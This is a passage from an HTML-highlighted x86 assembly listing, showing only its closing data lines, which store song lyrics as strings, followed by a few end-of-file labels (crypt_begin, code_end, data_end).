         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'I am the man that walks alone'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'And when I''m walking a dark road'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'At night or strolling through the park'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'When the light begins to change'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'I sometimes feel a little strange'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'A little anxious when it''s dark'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">crypt_begin</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">code_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">data_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0">      </span><span class="sc5">code_begin</span><span class="sc0">
</span></div></body>
</html>
